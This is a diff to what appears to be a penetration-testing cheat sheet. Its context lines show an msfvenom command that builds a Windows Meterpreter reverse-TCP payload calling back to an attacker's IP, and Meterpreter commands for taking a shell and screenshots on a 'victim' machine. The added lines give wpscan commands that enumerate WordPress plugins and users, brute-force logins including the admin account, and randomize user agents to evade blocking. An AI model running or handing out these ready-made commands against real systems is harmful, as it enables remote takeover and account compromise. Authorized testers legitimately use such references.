@@ -220,10 +220,23 @@ exploit  # Launches the handler and awaits the reverse connection from the targe
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.
 
-## Meterpreter Commands
+### Meterpreter Commands
 sysinfo  # To view the victim's system information
 shell  # To access the command line on the victim's computer
-screenshot  # To take a screenshot of the victim's screen
+screenshot  # To take a screenshot of the victim's screen´
+
+## Wpscan
+
+wpscan -e p --url <target> --disable-tls-checks --no-banner --plugins-detection aggressive -t 100 # Enumerates installed WordPress plugins (aggressive detection), ignores TLS cert errors, with 100 concurrent threads
+wpscan --url <target> # Performs a basic WordPress scan (version, readme, theme, headers)
+wpscan --url <target> -e vp,vt # Enumerates only vulnerable plugins and vulnerable themes
+wpscan --url <target> -e u # Enumerates WordPress usernames
+wpscan --url <target> -e ap,at,tt # Enumerates all plugins, all themes, and timthumb files
+wpscan --url <target> --api-token <token> # Runs a scan with vulnerability database lookups via WPScan API (requires free/paid API token)
+wpscan --url <target> -U <userlist> -P <passwordlist> # Performs a login brute-force attack using supplied username and password lists
+wpscan --url <target> -U admin -P <passwordlist> --max-threads 50 # Brute-forces the admin account's password with 50 concurrent threads
+wpscan --url <target> --enumerate u1-100 # Enumerates users by ID range (useful when default user listing is disabled)
+wpscan --url <target> --random-user-agent # Randomizes the User-Agent header per request to reduce fingerprinting/blocking
 
 # Wireless
 
